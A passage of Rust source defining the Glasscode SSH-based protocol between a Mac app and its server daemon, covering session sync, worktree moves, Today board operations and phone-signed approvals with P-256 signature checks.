//! Glasscode ⇄ glasscoded: the protocol between the Mac app and the daemon on a developer's
//! server, and the client side of it.
//!
//! The transport is the developer's own SSH (usually over Tailscale): the client runs
//! `ssh <server> ~/.glasscode/bin/glasscoded rpc`, and that process bridges stdio to the
//! daemon's unix socket. Messages are one JSON object per line:
//!
//! ```text
//! → {"id":1,"method":"sessions.list","params":{}}
//! ← {"id":1,"result":[…]}            or   {"id":1,"error":"…"}
//! ```
//!
//! Sessions on the server run inside tmux (a dedicated `glasscode` socket), so they survive
//! the laptop closing, SSH dropping and the daemon restarting. A client shows one by running
//! the `Attach` command through `ssh -t`.

use std::collections::HashMap;
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Mutex, mpsc};
use std::time::Duration;

use anyhow::{Context as _, anyhow, bail};
use serde::de::DeserializeOwned;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::agents::AgentActivity;
use crate::git::Worktree;
use crate::model::{Account, AgentKind, Defaults, Project, Session};
use crate::versions::ApprovedVersions;

/// Bumped when a message changes shape; the client refuses to talk to another version and
/// offers to update the daemon instead.
pub const PROTOCOL_VERSION: u32 = 2;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Request {
    pub id: u64,
    pub method: String,
    #[serde(default)]
    pub params: Value,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Response {
    pub id: u64,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub result: Option<Value>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Hello {
    pub version: String,
    /// The release build (0 for a development build; older daemons send none).
    #[serde(default)]
    pub build: u64,
    pub protocol: u32,
    pub host: String,
    pub os: String,
    pub arch: String,
    pub user: String,
    pub home: PathBuf,
    pub tmux: Option<String>,
    pub claude: Option<String>,
    pub codex: Option<String>,
    pub approved: ApprovedVersions,
    /// What this daemon can do beyond protocol 2 ("phone": prompts, transcripts, diffs, PRs,
    /// phone keys; "owners": moves by worktree with an owner record). Older daemons send none.
    #[serde(default)]
    pub features: Vec<String>,
    /// The server's machine id (`authority/machine.json` there), for the owner records of
    /// worktrees. Older daemons send none.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub machine: Option<crate::paths::MachineId>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum CheckLevel {
    Ok,
    Warn,
    Fail,
}

/// One line of `glasscoded doctor`: is the server ready to keep sessions running?
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Check {
    pub name: String,
    pub level: CheckLevel,
    pub detail: String,
    /// What to run to fix it, when there is a command for that.
    #[serde(default)]
    pub fix: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct RemoteSession {
    pub session: Session,
    /// Its tmux session exists (the agent or shell is running).
    pub running: bool,
    pub activity: Option<AgentActivity>,
    pub tmux_name: String,
    /// The question the agent's screen shows right now (permission, approval).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub prompt: Option<crate::prompt::PendingPrompt>,
    /// The agent's last reply, for the session list.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub last_reply: Option<String>,
    /// When the conversation last changed (seconds since the epoch).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub updated_at: Option<u64>,
    /// The worktree's pull request at a glance (the server refreshes these every minute).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pr: Option<crate::github::PrSummary>,
    /// Set for a session that runs on a Mac and is synced here (`ServerState::mirrors`): the
    /// Mac's name. Phones show it, can answer and type (the Mac picks it up), or continue it
    /// on the server.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    /// When the Mac last synced it (seconds since the epoch).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub synced_at: Option<u64>,
    /// Its agent lost its login here ("Login expired"): it needs signing in again, from the
    /// Mac's Server dialog (Accounts on the server).
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub signed_out: bool,
}

/// A phone allowed to reach this server: its key in `~/.ssh/authorized_keys`, limited to
/// `glasscoded gate`.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PhoneKey {
    pub name: String,
    /// `ecdsa-sha2-nistp256 AAAA…` (OpenSSH public key, without a comment).
    pub key: String,
}

/// What `phones.add` answers: how the phone should know this server.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PhonePairing {
    pub user: String,
    pub host: String,
    /// The server's SSH host keys (`ssh-ed25519 AAAA…`), for the phone to pin.
    pub host_keys: Vec<String>,
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct ServerState {
    pub projects: Vec<Project>,
    pub worktrees: HashMap<String, Vec<Worktree>>,
    pub accounts: Vec<Account>,
    /// Whether each account has a login on the server (file present; never read).
    pub signed_in: HashMap<String, bool>,
    pub defaults: Defaults,
    pub sessions: Vec<RemoteSession>,
    /// Why pull requests are not shown, when GitHub is not usable on the server.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub github: Option<String>,
    /// Each project's GitHub repository (`owner/name`), by project id.
    #[serde(default)]
    pub repos: HashMap<String, String>,
    /// Sessions running on Macs, synced here (their `host` is the Mac).
    #[serde(default)]
    pub mirrors: Vec<RemoteSession>,
    /// Worktrees a Mac left with uncommitted work and no open session at a switch: a copy is
    /// here, and the worktree moves when it is opened here (`worktrees.open_parked`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub parked: Vec<ParkedWorktree>,
}

/// A worktree's copy left on the server at a switch, without moving it (`worktrees.park`): its
/// HEAD and uncommitted snapshot are in `refs/glasscode/parked/<token>/{head,snap}`.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct ParkedWorktree {
    pub key: crate::owners::WorktreeKey,
    /// The project on the server.
    pub project_id: String,
    #[serde(default)]
    pub branch: Option<String>,
    pub token: String,
    /// The Mac that left it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub machine: Option<crate::paths::MachineId>,
    /// When (seconds since the epoch).
    pub at: u64,
}

// ----- Mac sessions synced to the server ("mirrors") -----------------------------------------

/// A Mac session's state, sent every few seconds while the Mac is connected
/// (`mirror.sync`). Its worktree goes as git refs (`refs/glasscode/mirror/<token>/{head,snap}`
/// in the server's clone of the project), its conversation by `mirror.conversation`.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct MirrorMeta {
    /// The session as the Mac has it (its worktree is the Mac's folder).
    pub session: Session,
    /// The server's project it belongs to.
    pub project_id: String,
    pub running: bool,
    #[serde(default)]
    pub activity: Option<AgentActivity>,
    #[serde(default)]
    pub prompt: Option<crate::prompt::PendingPrompt>,
    /// The ref names under refs/glasscode/mirror/.
    pub token: String,
    #[serde(default)]
    pub branch: Option<String>,
    /// What the refs hold (None until the first push).
    #[serde(default)]
    pub head: Option<String>,
    #[serde(default)]
    pub snap: Option<String>,
    /// The worktree's `.env` files, when they changed since the last sync.
    #[serde(default)]
    pub env: Option<Vec<EnvFile>>,
    /// The account the conversation belongs to on the Mac (id and name), for picking the
    /// matching one on the server.
    #[serde(default)]
    pub account: Option<Account>,
    /// Where a Codex conversation lives under the account's folder (Claude's is derived).
    #[serde(default)]
    pub conversation_rel: Option<PathBuf>,
    /// Its worktree's owner-record key (`owners`). Older Macs send none.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub key: Option<crate::owners::WorktreeKey>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct MirrorSync {
    /// The Mac's name, for phones.
    pub mac: String,
    /// The Mac's home folder (folders map by their place under it).
    pub home: PathBuf,
    /// Every session the Mac runs: the server forgets the ones not listed.
    pub sessions: Vec<MirrorMeta>,
    /// The Mac's machine id (`authority/machine.json`), for the owner records. Older Macs send
    /// none.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub machine: Option<crate::paths::MachineId>,
    /// The Mac's worktrees with no open session, by key: the reply's `owners` covers them too.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub worktree_keys: Vec<crate::owners::WorktreeKey>,
    /// The Mac's Today board (a `board::Board`, as JSON): the server merges it into its own copy
    /// and sends the merged board back. Older Macs send none.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub board: Option<Value>,
    /// The Mac is going to sleep (its last sync before it): the server may continue a session
    /// that was working at once, instead of after the usual wait. The next sync clears it.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub asleep: bool,
    /// The Mac's own journal events since the last sync (M57, v2; the server pulls back none of
    /// them), and its effect records that changed (merged by key and generation).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub journal: Vec<crate::journal::Event>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub effects: Vec<crate::effects::EffectRecord>,
    /// The Mac's own words records since the last sync (M57), kept in `words/<mac>/` there.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub words: Vec<crate::words::WordsRecord>,
    /// The Mac's own changes to the manager's conversation since the last sync (M57), taken in
    /// by stamp.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub conversation: Vec<crate::conversation::Record>,
    /// The Mac's pending actions asked or answered since the last sync (M57; no authority).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pending: Vec<crate::gate::PendingAction>,
    /// The Mac's own changes to work items since the last sync (M57), merged by stamp.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub work: Vec<crate::work::WorkItem>,
    /// The Mac's own changes to the follow-ups since the last sync (M56.2), merged by stamp.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub follow_ups: Vec<crate::work::FollowSync>,
    /// How far the Mac has the server's records (the last reply's `have`, once taken in).
    #[serde(default)]
    pub have: HaveCursors,
    /// The Mac's engine switch (M57): the server keeps the same, one way like the authority, so
    /// its journal, words and conversation run as the Mac's do.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub engine: Option<crate::store::EngineSwitch>,
    /// What the server's manager needs from the Mac to run its wakes while it is home (M57).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub manager: Option<ManagerFromMac>,
    /// The window ops of the server's manager this Mac has (from earlier replies): the server
    /// stops sending them.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub window_acks: Vec<u64>,
    /// The Mac's Today board as it reads now (a `TodaySnapshot`), for phones. Kept as JSON so a
    /// field one side does not know never fails the whole sync.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub today: Option<Value>,
    /// Answers to `glasscode` commands that sessions on the server sent (`cli_calls`).
    #[serde(default, skip_serializing_if = "Vec::is_empty", deserialize_with = "lenient_list")]
    pub cli_replies: Vec<RemoteCallReply>,
    /// What the Mac got in the last reply (`today_ops` by `seq`, `cli_calls` by `id`): the server
    /// sends each again until it is here, and the Mac does each once.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub today_acks: Vec<u64>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cli_acks: Vec<u64>,
    /// Settings › Permissions' "Tell new sessions about the glasscode command" is off.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub skill_off: bool,
    /// The Mac's approved authority (M21.1, crit-5): its policy without the projects that stay on
    /// the Mac, its pause and its paired phones. Only to a server that announces "authority"; the
    /// server keeps it as `authority/from-mac.json`, decides its own sessions by it, and never
    /// sends authority back: no reply has a field for it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub authority: Option<crate::gate::FromMac>,
}

/// A list where an entry that does not read is left out instead of failing the message.
fn lenient_list<'de, D, T>(deserializer: D) -> Result<Vec<T>, D::Error>
where
    D: serde::Deserializer<'de>,
    T: serde::de::DeserializeOwned,
{
    let values = Vec::<Value>::deserialize(deserializer).unwrap_or_default();
    Ok(values.into_iter().filter_map(|v| serde_json::from_value(v).ok()).collect())
}

/// The Mac's Today, as phones show it: the board, what needs the person, and what agents
/// ask to do (`today.get`).
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct TodaySnapshot {
    /// The Mac's name and when it was made (seconds since the epoch).
    pub mac: String,
    pub at: u64,
    /// This run of the Mac app: an answer to an approval names it, so a number from an earlier
    /// run (or another Mac) is never taken for a new request with the same number.
    #[serde(default)]
    pub launch: String,
    /// Which Mac (the server adds it; phones send it back with what they do).
    #[serde(default)]
    pub mac_id: String,
    /// "Good morning" sentence: "3 things are due or late, …".
    pub summary: String,
    pub view: crate::board::TodayView,
    #[serde(default)]
    pub needs: Vec<TodayNeed>,
    #[serde(default)]
    pub approvals: Vec<TodayApproval>,
    /// What agents did today, newest first.
    #[serde(default)]
    pub activity: Vec<TodayActivity>,
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct TodayActivity {
    pub at: u64,
    pub who: String,
    pub what: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_title: Option<String>,
}

/// Something that needs the person now (a session waiting for an answer, a remote task, CI).
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct TodayNeed {
    pub title: String,
    pub what: String,
    /// The session it is about, if any (a Mac session, or one on the server).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session: Option<String>,
}

/// An agent's request waiting for the person's Allow or Deny.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct TodayApproval {
    pub id: u64,
    /// "Claude", "A program outside Glasscode".
    pub who: String,
    /// "remove the worktree eng-708-export".
    pub what: String,
    pub command: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_title: Option<String>,
}

/// What a phone did on Today, for the Mac to carry out (`today.op`).
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "op", rename_all = "snake_case")]
pub enum TodayOp {
    /// Tick an item off (`done: false` puts it back).
    Done { key: String, done: bool },
    /// Out of sight until that day (`2026-10-28`); none: back now.
    Snooze { key: String, #[serde(default)] until: Option<String> },
    Focus { key: String, on: bool },
    /// A line for the add box ("Ask Jordan about the token by Friday").
    Add { text: String },
    /// Answer an agent's request. Only the person's phone can: `sig` is its device key's
    /// signature of `decide_message(launch, approval, allow)`, `key` that key (OpenSSH form),
    /// which the Mac knows from pairing.
    Decide {
        approval: u64,
        allow: bool,
        #[serde(default)]
        launch: String,
        #[serde(default)]
        key: String,
        #[serde(default)]
        sig: String,
    },
}

/// What a phone signs to answer an approval.
pub fn decide_message(launch: &str, approval: u64, allow: bool) -> String {
    format!("glasscode-decide\n{launch}\n{approval}\n{}", if allow { "allow" } else { "deny" })
}

/// Check a phone's signature (P-256, SHA-256; the raw 64-byte r‖s or DER, base64) with its
/// OpenSSH public key (`ecdsa-sha2-nistp256 AAAA…`).
pub fn verify_phone_signature(openssh_key: &str, message: &[u8], signature_b64: &str) -> bool {
    use base64::Engine as _;
    use p256::ecdsa::signature::Verifier as _;
    let Some(blob) = openssh_key.split_whitespace().nth(1).and_then(|b| base64::engine::general_purpose::STANDARD.decode(b).ok()) else { return false };
    // The blob: string "ecdsa-sha2-nistp256", string "nistp256", string Q.
    let mut rest = blob.as_slice();
    let mut fields: Vec<&[u8]> = Vec::new();
    while rest.len() >= 4 && fields.len() < 3 {
        let n = u32::from_be_bytes([rest[0], rest[1], rest[2], rest[3]]) as usize;
        if rest.len() < 4 + n {
            return false;
        }
        fields.push(&rest[4..4 + n]);
        rest = &rest[4 + n..];
    }
    let [kind, curve, point] = fields.as_slice() else { return false };
    if *kind != b"ecdsa-sha2-nistp256" || *curve != b"nistp256" {
        return false;
    }
    let Ok(key) = p256::ecdsa::VerifyingKey::from_sec1_bytes(point) else { return false };
    let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(signature_b64.trim()) else { return false };
    let signature = match p256::ecdsa::Signature::from_slice(&bytes) {
        Ok(s) => s,
        Err(_) => match p256::ecdsa::Signature::from_der(&bytes) {
            Ok(s) => s,
            Err(_) => return false,
        },
    };
    key.verify(message, &signature).is_ok()
}

/// A `glasscode` command run in a session on the server, for the Mac to do.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct RemoteCall {
    pub id: u64,
    pub request: crate::control::Request,
    /// The server session that ran it (checked by the server), its title and agent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_title: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent: Option<AgentKind>,
    /// The server project of that session (by name; the Mac finds its own by name).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub project: Option<String>,
    /// The op the words name in the registry (`ops::name_of`), for the Mac and the journal.
    /// Older servers send none.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub op: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct RemoteCallReply {
    pub id: u64,
    pub reply: crate::control::Reply,
}

/// Something a phone did to a Mac session, for the Mac to carry out. The server relays it, and
/// the Mac does it only when the phone signed it (`signed`, [`check_relayed`]): the server cannot
/// type into the Mac's sessions itself.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum MirrorInput {
    /// `device`: the phone that typed it, as its connection declared it (M13.2); none from an
    /// older server, or when no phone sent it.
    Text {
        text: String,
        enter: bool,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        device: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        signed: Option<InputSig>,
    },
    Answer {
        option: u32,
        #[serde(default)]
        text: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        device: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        signed: Option<InputSig>,
    },
    Keys {
        keys: Vec<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        signed: Option<InputSig>,
    },
}

/// A phone's signature of one input to a Mac session: its device key (OpenSSH form, pinned on the
/// Mac at pairing), a nonce it never uses twice, and its signature of [`input_message`].
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct InputSig {
    pub key: String,
    pub nonce: String,
    pub sig: String,
}

impl MirrorInput {
    pub fn signed(&self) -> Option<&InputSig> {
        match self {
            MirrorInput::Text { signed, .. } | MirrorInput::Answer { signed, .. } | MirrorInput::Keys { signed, .. } => signed.as_ref(),
        }
    }

    /// What it does, as the phone signs it.
    fn body(&self) -> String {
        match self {
            MirrorInput::Text { text, enter, .. } => format!("text\n{enter}\n{text}"),
            MirrorInput::Answer { option, text, .. } => format!("answer\n{option}\n{}", text.as_deref().unwrap_or_default()),
            MirrorInput::Keys { keys, .. } => format!("keys\n{}", keys.join("\n")),
        }
    }
}

/// What a phone signs to type into, answer in or press keys in a Mac session `session`: this run
/// of the Mac app (`launch`, from its Today), a nonce of its own and the input.
pub fn input_message(launch: &str, session: &str, nonce: &str, input: &MirrorInput) -> String {
    format!("glasscode-input\n{launch}\n{session}\n{nonce}\n{}", input.body())
}

/// Whether the Mac does an input the server relayed into its session `session` (an `agent`
/// session): only one a phone it paired signed (`paired`, by [`crate::gate::device_id`]), for
/// this run of the app, never twice (`used` keeps the nonces of this run), and never into a shell.
/// What it refuses says why. The open prompt's options are checked where the screen is read.
pub fn check_relayed(input: &MirrorInput, session: &str, agent: AgentKind, launch: &str, paired: &dyn Fn(&str) -> bool, used: &mut std::collections::HashSet<String>) -> Result<(), String> {
    if agent == AgentKind::Shell {
        return Err("a shell takes nothing relayed by the server".into());
    }
    let Some(signed) = input.signed() else { return Err("it was not signed by a paired iPhone".into()) };
    if signed.nonce.is_empty() || signed.nonce.len() > 64 || launch.is_empty() {
        return Err("it was not signed for this run of Glasscode".into());
    }
    if !paired(&crate::gate::device_id(&signed.key)) || !verify_phone_signature(&signed.key, input_message(launch, session, &signed.nonce, input).as_bytes(), &signed.sig) {
        return Err("it was not signed by a paired iPhone".into());
    }
    if !used.insert(format!("{}:{}", crate::gate::device_id(&signed.key), signed.nonce)) {
        return Err("it was relayed before".into());
    }
    Ok(())
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub struct MirrorSyncReply {
    /// Phone input waiting for each session.
    #[serde(default)]
    pub inbox: HashMap<String, Vec<MirrorInput>>,
    /// Sessions continued on the server meanwhile: Mac session id → server session id.
    #[serde(default)]
    pub moved: HashMap<String, String>,
    /// How much of each conversation the server has (bytes), so the Mac sends the rest.
    #[serde(default)]
    pub conversation_sizes: HashMap<String, u64>,
    /// What phones did on Today (`TodayOp`s, each with a `seq`), until the Mac has them. JSON,
    /// so an action this Mac does not know yet is left out instead of failing the reply.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub today_ops: Vec<Value>,
    /// `glasscode` commands from sessions on the server (`RemoteCall`s), until the Mac has them.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cli_calls: Vec<Value>,
    /// The owner records of the worktrees this Mac's sessions are in, when they have one, so the
    /// Mac stops a copy that moved to the server meanwhile.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub owners: HashMap<crate::owners::WorktreeKey, crate::owners::OwnerRecord>,
    /// The server cannot read its owner records (a damaged file): the Mac keeps what it knew,
    /// and starts nothing it last knew to be the server's.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub owners_unknown: bool,
    /// The server's Today board after merging the Mac's (a `board::Board`, as JSON).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub board: Option<Value>,
    /// The server's effect records that changed since this Mac's last sync (M57).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub effects: Vec<crate::effects::EffectRecord>,
    /// The server's own words records since this Mac's last sync (a phone's input; never tier
    /// one, which the Mac refuses from the server).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub words: Vec<crate::words::WordsRecord>,
    /// The server's own changes to the manager's conversation since this Mac's last sync.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub conversation: Vec<crate::conversation::Record>,
    /// The server's pending actions asked or settled since this Mac's last sync.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pending: Vec<crate::gate::PendingAction>,
    /// The server's own changes to work items since this Mac's last sync.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub work: Vec<crate::work::WorkItem>,
    /// The server's own changes to the follow-ups since this Mac's last sync (M56.2).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub follow_ups: Vec<crate::work::FollowSync>,
    /// Where these records stopped: the Mac sends it back with its next sync once it took them
    /// in, so a reply lost on the way brings them again.
    #[serde(default)]
    pub have: HaveCursors,
    /// The kinds of the Mac's records this server could not take in ("journal", "effects",
    /// "words", "conversation", "pending", "work", "follow_ups"): the Mac sends them again.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub not_taken: Vec<String>,
    /// The notices of the server's manager since the last sync, for the Mac to show (M57).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub notices: Vec<ServerNotice>,
    /// The window ops the server's manager asked for while the Mac was away (M57): the Mac runs
    /// each once, through its own gate, and names it in `window_acks`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub window_ops: Vec<QueuedWindowOp>,
    /// This Mac is an observer here (M57): another Mac is the primary, whose authority the server
    /// keeps; this one reads, shows and answers approvals, and acts on its own sessions only.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub observer: bool,
    /// The server's latest stamp (its clock): whether the Mac's clock went back is told against it
    /// too, and "use the server's copy" goes on from it (crit-9).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub server_stamp: Option<crate::identity::Hlc>,
    /// What the paired phones said their glasses do, by device (G08): the Mac's title bar shows
    /// it while a phone talks to the server.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub presence: HashMap<String, Value>,
}

/// A window op of the server's manager, kept for the Mac (it runs in the window only).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct QueuedWindowOp {
    pub id: u64,
    /// `{"op": …, "args": …}`.
    pub op: Value,
    pub queued_ms: u64,
    /// A card asked on the server that the person approved on the Mac, for an op only the Mac
    /// runs: the Mac runs it as that approval, once its own copy of the card says so.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub card: Option<String>,
}

/// What the server's manager needs from the Mac (M57): whether the manager is on, the brain the
/// person chose, and the projects as a wake sees them (their keys and names, Careful ones, and
/// whether the manager's account may read them), from the Mac's gate. Kept on the server, so its
/// wakes run while the Mac is away.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ManagerFromMac {
    pub enabled: bool,
    /// Its name, for the glasses while this server is home (G08); none from an older Mac.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
    /// The brain's agent; none: Claude's (the only wake lane in release 1).
    pub agent: Option<crate::model::AgentKind>,
    pub model: Option<String>,
    /// The account the person chose for it, by its id or name; the server uses its own account of
    /// that name, else its default one (no credential is ever copied).
    pub account: Option<String>,
    pub projects: Vec<crate::runtime::situation::Project>,
    /// What the follow-ups need on the server while it is home (M56.2); none: the `follow-ups`
    /// built-in is off on the Mac (or the Mac is older), and they do not run there.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub follow_ups: Option<FollowUpsFromMac>,
}

/// The follow-ups' part of what the Mac tells the server (M56.2): the person's GitHub login (whose
/// reviews are followed; the server's own `gh` account may be another), and the teammates by name
/// and login, as Settings › Manager has them (no contact: messages are the Mac's to send).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct FollowUpsFromMac {
    pub me: Option<String>,
    pub people: Vec<Teammate>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct Teammate {
    pub name: String,
    pub github: String,
}

/// A notice of the server's manager (one a matter: a newer one replaces it).
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct ServerNotice {
    pub title: String,
    pub body: String,
    pub matter: String,
}

/// How far the Mac has the server's records of each kind (M57). The server keeps nothing of it:
/// each reply says where its records stopped, and the Mac sends that back once it took them in.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct HaveCursors {
    /// The server's clock when it read its effect records, and its pending actions.
    pub effects_ms: u64,
    pub pending_ms: u64,
    /// The newest of the server's own words records sent.
    pub words_ms: u64,
    pub conversation: crate::conversation::SyncCursor,
    pub work: Option<crate::identity::Hlc>,
    pub follow_ups: Option<crate::identity::Hlc>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct CreateSession {
    pub project_id: String,
    /// An existing worktree; `None` with `new_branch` makes one, `None` without uses the root.
    #[serde(default)]
    pub worktree: Option<PathBuf>,
    #[serde(default)]
    pub new_branch: Option<String>,
    pub agent: AgentKind,
    #[serde(default)]
    pub account_id: Option<String>,
    #[serde(default)]
    pub title: Option<String>,
    /// A conversation id to resume instead of starting a new one.
    #[serde(default)]
    pub resume: Option<String>,
    #[serde(default)]
    pub initial_prompt: Option<String>,
    /// Where the work starts (newer Macs and phones send it; `new_branch` alone means `Main`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub start: Option<StartFrom>,
    /// A review session: the pull request it reviews.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub review: Option<crate::model::ReviewRef>,
    /// Review files to put in place before the agent starts (`pr.md`: what the PR says).
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub review_files: HashMap<String, String>,
    /// The model and permission mode it starts with (`glasscode session new --model/--mode`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mode: Option<String>,
    /// Part of a move: the session is made but its agent waits until the move commits
    /// (`owners.commit`), and making it again with the same tag gives the same session.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub held: Option<MoveTag>,
}

/// One session of a move: the worktree, the epoch it moves to, and the session it continues.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct MoveTag {
    pub key: crate::owners::WorktreeKey,
    pub epoch: u64,
    /// The session on the machine the worktree leaves.
    pub from: String,
}

/// `owners.begin`: start moving a worktree from `from` to `to`; `epoch` is the one read.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct OwnersBegin {
    pub key: crate::owners::WorktreeKey,
    pub from: crate::paths::MachineId,
    pub to: crate::paths::MachineId,
    pub epoch: u64,
}

/// What `owners.begin`, `owners.commit` and `owners.abort` answer.
#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum OwnersReply {
    Ok {
        record: crate::owners::OwnerRecord,
        /// After a commit here: the held sessions whose agent could not start (titles).
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        not_started: Vec<String>,
    },
    Refused { error: crate::owners::OwnerError },
}

/// Where a new session's work starts.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum StartFrom {
    /// A new branch (`new_branch`) from the freshly fetched default branch.
    Main,
    /// Carry on with a pull request on its own branch, at its latest commit.
    PullRequest { number: u64, head: String, same_repo: bool },
    /// Review a pull request in `review/<number>`, at its latest commit.
    Review { number: u64, #[serde(default)] base: String },
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct AddProject {
    /// Clone this URL…
    #[serde(default)]
    pub url: Option<String>,
    /// …into this folder (or register it, when it already is a repository). Using the same
    /// path as on the laptop keeps worktrees and conversations interchangeable.
    #[serde(default)]
    pub path: Option<PathBuf>,
